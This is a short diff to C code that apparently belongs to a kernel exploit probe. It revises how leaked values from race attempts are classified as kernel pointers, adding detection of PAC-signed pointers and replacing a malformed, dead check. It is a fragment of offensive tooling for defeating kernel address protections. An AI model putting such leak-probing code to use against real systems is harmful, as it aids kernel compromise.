@@ -7458,10 +7458,13 @@ static void r323_probe(void) {
                              attempt, q * 8, val);
                         kptr_hits++;
                     }
-                    /* Also check for PAC-signed pointers (top byte non-zero, rest looks like kptr) */
-                    uint64_t stripped = val & 0x0000007FFFFFFFFFULL;
-                    if (stripped > 0xfffffff000000000ULL && stripped < 0xfffffffg00000000ULL) {
-                        /* This can't happen — stripped removes the high bits. Skip. */
+                    /* PAC-signed kernel pointers have non-zero top bits;
+                       check if stripping PAC gives kernel range */
+                    uint64_t stripped = val | 0xFFFFFF8000000000ULL;
+                    if (stripped != val && (stripped >> 28) == 0xfffffffULL) {
+                        rlog("  !!! PAC-KPTR at attempt=%d offset=%d: raw=0x%llx stripped=0x%llx !!!\n",
+                             attempt, q * 8, val, stripped);
+                        kptr_hits++;
                     }
                 }
                 total_races++;
